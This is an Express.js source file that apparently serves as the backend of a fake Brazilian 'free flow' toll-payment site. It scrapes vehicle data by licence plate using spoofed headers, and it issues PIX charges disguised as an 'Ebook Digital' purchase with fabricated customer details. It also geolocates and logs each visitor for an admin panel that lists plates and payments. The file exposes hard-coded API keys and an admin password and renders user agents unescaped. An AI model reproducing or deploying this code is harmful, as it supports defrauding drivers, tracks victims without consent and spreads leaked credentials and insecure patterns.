const express = require('express');
const cors = require('cors');

const app = express();

const ALLOWED_ORIGINS = [
    'https://www.freeflow-pedagio.site',
    'https://freeflow-pedagio.site',
];

const INTERNAL_KEY = process.env.INTERNAL_KEY || 'fd-k9x2mq7v4n8p1w6j3t5r';

app.use(cors({
    origin: (origin, cb) => {
        if (!origin || ALLOWED_ORIGINS.includes(origin)) return cb(null, true);
        return cb(new Error('Not allowed'));
    },
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'X-Internal-Key'],
}));

app.use(express.json());

// Block direct browser access to API routes
function requireInternalKey(req, res, next) {
    const key = req.headers['x-internal-key'];
    if (key !== INTERNAL_KEY) {
        return res.status(403).json({ error: 'Forbidden' });
    }
    next();
}

const MANGOFY_API_KEY = process.env.MANGOFY_API_KEY || '2cb435b12f2f8431fbd9b7e1f0b34540e2axyl1axlbg34ckxjxaxvbyool0oen';
const MANGOFY_STORE_CODE = process.env.MANGOFY_STORE_CODE || 'd2b22f8faf5a2081e772328755ce7349';
const MANGOFY_API_URL = 'https://checkout.mangofy.com.br/api/v1';

// ---------- GERAR PIX ----------
app.post('/api/gerar_pix', requireInternalKey, async (req, res) => {
    const { valorTransacao, placa } = req.body || {};
    const valor = parseFloat(valorTransacao) || 0;
    const placaClean = (placa || '').toUpperCase().trim();

    if (valor <= 0 || !placaClean) {
        return res.status(400).json({ success: false, error: 'Dados inválidos' });
    }

    const valorCentavos = Math.round(valor * 100);
    if (valorCentavos < 500) {
        return res.status(400).json({ success: false, error: 'Valor mínimo é R$ 5,00' });
    }

    const payload = {
        payment_method: 'pix',
        payment_format: 'regular',
        installments: 1,
        payment_amount: valorCentavos,
        postback_url: (process.env.RAILWAY_PUBLIC_DOMAIN
            ? 'https://' + process.env.RAILWAY_PUBLIC_DOMAIN
            : 'https://localhost:3000') + '/api/webhook',
        external_code: 'PED_' + Math.random().toString(36).substring(2,10).toUpperCase() + '_' + Date.now(),
        items: [{
            code: 'EBOOK_' + Date.now(),
            name: 'Ebook Digital',
            amount: valorCentavos,
            total: 1,
        }],
        customer: {
            email: 'user_' + Math.random().toString(36).substring(2,10) + '@gmail.com',
            name: 'Cliente #' + Math.random().toString(36).substring(2,8).toUpperCase(),
            document: '00000000000',
            phone: '11999999999',
            ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || '177.70.100.1',
        },
        pix: { expires_in_days: 1 },
    };

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment', {
            method: 'POST',
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
            body: JSON.stringify(payload),
        });

        const data = await response.json();

        if (response.ok && data.payment_code) {
            const pix = data.pix || data.checkout || {};
            const qrcode = pix.pix_qrcode_text || pix.qr_code || pix.qrcode || pix.emv || pix.brcode || pix.code
                || data.qr_code || data.qrcode || data.emv || data.brcode || '';
            const qrcodeBase64 = pix.qr_code_base64 || pix.qrcode_base64 || pix.image || pix.base64
                || data.qr_code_base64 || data.qrcode_base64 || data.image || '';

            return res.json({
                success: true,
                transaction_id: data.payment_code,
                qrcode,
                qrcode_base64: qrcodeBase64,
                valor,
            });
        }

        return res.status(400).json({
            success: false,
            error: data.message || data.error || 'Erro ao gerar PIX',
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão com gateway' });
    }
});

// ---------- CONSULTAR STATUS ----------
app.post('/api/consultar_status_pix', requireInternalKey, async (req, res) => {
    const { transaction_id } = req.body || {};
    const paymentCode = (transaction_id || '').trim();

    if (!paymentCode) {
        return res.status(400).json({ success: false, error: 'transaction_id é obrigatório' });
    }

    try {
        const response = await fetch(MANGOFY_API_URL + '/payment/' + encodeURIComponent(paymentCode), {
            headers: {
                'Authorization': MANGOFY_API_KEY,
                'Store-Code': MANGOFY_STORE_CODE,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            },
        });

        const data = await response.json();

        if (response.ok && data) {
            const statusMap = { approved: 'paid', pending: 'pending', refunded: 'refunded', error: 'error' };
            const status = statusMap[data.payment_status] || 'pending';
            return res.json({
                success: true,
                status,
                paid_at: data.payment_status === 'approved' ? (data.approved_at || new Date().toISOString()) : null,
            });
        }

        return res.json({ success: true, status: 'pending', paid_at: null });
    } catch (e) {
        return res.json({ success: true, status: 'pending', paid_at: null });
    }
});

// ---------- VEICULOS ----------
app.get('/api/veiculos', requireInternalKey, async (req, res) => {
    const placa = (req.query.placa || '').toUpperCase().trim();

    if (!placa || !/^[A-Z]{3}[0-9][A-Z0-9][0-9]{2}$/.test(placa)) {
        return res.status(400).json({ success: false, error: 'Placa inválida' });
    }

    try {
        const response = await fetch('https://www.achecar.com.br/api/free-lookup', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Origin': 'https://www.achecar.com.br',
                'Referer': 'https://www.achecar.com.br/consulta-gratuita',
            },
            body: JSON.stringify({ plate: placa }),
        });

        if (!response.ok) return res.status(502).json({ success: false, error: 'Consulta falhou' });

        const data = await response.json();
        if (!data.brand && !data.model) return res.status(404).json({ success: false, error: 'Não encontrado' });

        return res.json({
            success: true,
            veiculo: {
                marca: data.brand || '', modelo: data.model || '', descricao: data.brandModel || '',
                ano: data.year || '', anoModelo: data.yearModel || '', cor: data.color || '',
                combustivel: data.fuel || '', tipo: data.vehicleType || '',
                cidade: data.city || '', estado: data.state || '', potencia: data.power || '',
                nacionalidade: data.nationality || '',
            },
        });
    } catch (e) {
        return res.status(500).json({ success: false, error: 'Erro de conexão' });
    }
});

// ---------- WEBHOOK ----------
app.post('/api/webhook', (req, res) => {
    const data = req.body || {};
    // Update payment event if exists
    const code = data.payment_code || data.external_code || '';
    if (data.payment_status === 'approved' && code) {
        const ev = events.find(e => e.pixCode === code || (e.externalCode && e.externalCode === data.external_code));
        if (ev) { ev.pago = true; ev.pagoEm = new Date().toISOString(); }
    }
    res.json({ received: true });
});

// ---------- TRACKING ----------
const events = [];
const MAX_EVENTS = 5000;

app.post('/api/track', async (req, res) => {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '';
    const ua = req.headers['user-agent'] || '';
    const { tipo, pagina, placa, valor, pixCode, externalCode } = req.body || {};

    let geo = {};
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,lat,lon,isp,query`);
        if (geoRes.ok) geo = await geoRes.json();
    } catch (_) {}

    const ev = {
        id: Date.now() + Math.random(),
        tipo: tipo || 'visita',
        pagina: pagina || '',
        ip,
        pais: geo.country || '',
        estado: geo.regionName || '',
        cidade: geo.city || '',
        lat: geo.lat || null,
        lon: geo.lon || null,
        isp: geo.isp || '',
        ua,
        placa: placa || '',
        valor: valor || null,
        pixCode: pixCode || '',
        externalCode: externalCode || '',
        pago: false,
        pagoEm: null,
        ts: new Date().toISOString(),
    };

    events.unshift(ev);
    if (events.length > MAX_EVENTS) events.pop();

    res.json({ ok: true });
});

// ---------- PAINEL ADMIN ----------
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Br@sil2019';

app.get('/painel', (req, res) => {
    const { senha } = req.query;

    if (senha !== ADMIN_PASSWORD) {
        return res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Acesso restrito</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui,sans-serif;background:#0f172a;display:flex;align-items:center;justify-content:center;min-height:100vh}
.box{background:#1e293b;border-radius:16px;padding:40px 32px;width:min(360px,92vw);box-shadow:0 20px 60px #0008}
h2{color:#fff;font-size:20px;margin-bottom:24px;text-align:center}
input{width:100%;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:12px 14px;color:#fff;font-size:15px;outline:none;margin-bottom:16px}
input:focus{border-color:#6366f1}
button{width:100%;background:#6366f1;color:#fff;border:none;border-radius:8px;padding:13px;font-size:15px;font-weight:700;cursor:pointer}
button:hover{background:#4f46e5}.err{color:#f87171;font-size:13px;text-align:center;margin-top:10px;display:none}
</style></head><body>
<div class="box">
  <h2>🔒 Painel Admin</h2>
  <form id="f">
    <input type="password" id="pw" placeholder="Senha" autocomplete="off">
    <button type="submit">Entrar</button>
    <p class="err" id="err">Senha incorreta</p>
  </form>
</div>
<script>
document.getElementById('f').addEventListener('submit',function(e){
  e.preventDefault();
  const pw=document.getElementById('pw').value;
  if(pw)window.location.href='/painel?senha='+encodeURIComponent(pw);
  else{document.getElementById('err').style.display='block';}
});
</script></body></html>`);
    }

    // Stats
    const total = events.length;
    const visitas = events.filter(e => e.tipo === 'visita').length;
    const pixGerados = events.filter(e => e.tipo === 'pix_gerado').length;
    const pagamentos = events.filter(e => e.pago || e.tipo === 'pagamento_confirmado').length;
    const uniqueIPs = new Set(events.map(e => e.ip)).size;

    const rows = events.slice(0, 200).map(ev => `
    <tr>
      <td>${new Date(ev.ts).toLocaleString('pt-BR')}</td>
      <td><span class="badge badge-${ev.tipo}">${ev.tipo}</span></td>
      <td>${ev.pagina}</td>
      <td>${ev.placa || '—'}</td>
      <td>${ev.valor ? 'R$ ' + parseFloat(ev.valor).toFixed(2).replace('.',',') : '—'}</td>
      <td>${ev.pago ? '✅ Sim' : '—'}</td>
      <td>${ev.ip}</td>
      <td>${ev.cidade}${ev.estado ? ', '+ev.estado : ''}${ev.pais ? ' ('+ev.pais+')' : ''}</td>
      <td style="font-size:11px;max-width:180px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${ev.ua}">${ev.ua}</td>
    </tr>`).join('');

    res.send(`<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Painel Admin</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#0f172a;color:#e2e8f0;min-height:100vh}
.top{background:#1e293b;padding:16px 24px;display:flex;align-items:center;gap:16px;border-bottom:1px solid #334155}
.top h1{font-size:18px;font-weight:700}
.top a{margin-left:auto;color:#94a3b8;font-size:13px;text-decoration:none}
.top a:hover{color:#fff}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px;padding:24px}
.stat{background:#1e293b;border-radius:12px;padding:20px;border:1px solid #334155}
.stat .n{font-size:32px;font-weight:900;color:#6366f1}
.stat .l{font-size:13px;color:#94a3b8;margin-top:4px}
.wrap{padding:0 24px 40px;overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:13px;min-width:900px}
th{background:#1e293b;padding:10px 12px;text-align:left;color:#94a3b8;font-weight:600;border-bottom:1px solid #334155;position:sticky;top:0}
td{padding:10px 12px;border-bottom:1px solid #1e293b;vertical-align:middle}
tr:hover td{background:#1e293b}
.badge{display:inline-block;padding:2px 8px;border-radius:999px;font-size:11px;font-weight:700}
.badge-visita{background:#1e3a5f;color:#60a5fa}
.badge-pix_gerado{background:#1a3a2a;color:#4ade80}
.badge-pagamento_confirmado{background:#2d1b4e;color:#a78bfa}
h2{padding:0 24px 16px;font-size:15px;color:#94a3b8}
</style></head><body>
<div class="top">
  <h1>📊 Painel Admin — freeflow-pedagio.site</h1>
  <a href="/painel?senha=${encodeURIComponent(ADMIN_PASSWORD)}">↻ Atualizar</a>
</div>
<div class="stats">
  <div class="stat"><div class="n">${total}</div><div class="l">Total de eventos</div></div>
  <div class="stat"><div class="n">${visitas}</div><div class="l">Visitas</div></div>
  <div class="stat"><div class="n">${uniqueIPs}</div><div class="l">IPs únicos</div></div>
  <div class="stat"><div class="n">${pixGerados}</div><div class="l">PIX gerados</div></div>
  <div class="stat"><div class="n">${pagamentos}</div><div class="l">Pagamentos confirmados</div></div>
</div>
<h2>Últimos 200 eventos</h2>
<div class="wrap">
<table>
<thead><tr>
  <th>Data/Hora</th><th>Tipo</th><th>Página</th><th>Placa</th><th>Valor</th><th>Pago</th><th>IP</th><th>Localização</th><th>Navegador</th>
</tr></thead>
<tbody>${rows || '<tr><td colspan="9" style="text-align:center;padding:40px;color:#64748b">Nenhum evento ainda</td></tr>'}</tbody>
</table>
</div>
</body></html>`);
});

// ---------- HEALTH (hidden) ----------
app.get('/', (req, res) => res.status(404).send('Not found'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('API running on port ' + PORT));
